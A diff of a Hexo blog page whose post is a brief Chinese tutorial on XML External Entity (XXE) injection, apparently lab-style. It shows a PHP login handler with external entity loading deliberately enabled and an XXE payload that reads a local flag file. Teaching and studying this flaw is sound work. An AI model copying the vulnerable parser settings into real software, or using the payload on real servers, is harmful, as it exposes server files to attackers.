@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -355,17 +355,16 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>　　XML语言，还是不能够理解<a id="more"></a></p>
-<h1 id="概述">概述</h1>
-<p>　　XXE攻击（XML External Entity），也就是<strong>XML外部实体注入漏洞</strong>。这个漏洞显然和XML有关。</p>
+        <p>　　XML语言，还是不能够理解<span id="more"></span></p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>　　XXE攻击（XML External Entity），也就是<strong>XML外部实体注入漏洞</strong>。这个漏洞显然和XML有关。</p>
 <p>假设有个应用有一个很简单的功能，html有个表单提交，如下：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pass</span>&gt;</span>123<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>服务端接受该xml之后，将其中的用户名和密码解析出来</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Username: &quot;</span>.$creds-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Password: &quot;</span>.$creds-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODRfMjAyMDAyMDYyMzA0MzcyOTBfMjA2NjQxNzM4Mi5wbmc?x-oss-process=image/format,png" /></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODRfMjAyMDAyMDYyMzA0MzcyOTBfMjA2NjQxNzM4Mi5wbmc?x-oss-process=image/format,png" alt=""></p>
 <p>如果给这个xml加上一段dtd，让xml解析我们引入的外部实体，这样，我们想读哪个文件，就读哪个文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;login&gt;</span><br><span class="line">  &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;login&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODVfMjAyMDAyMDYyMzE4NTgyNzFfMTE3MTM5OTk5MC5wbmc?x-oss-process=image/format,png" /></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODVfMjAyMDAyMDYyMzE4NTgyNzFfMTE3MTM5OTk5MC5wbmc?x-oss-process=image/format,png" alt=""></p>
 
     </div>
 
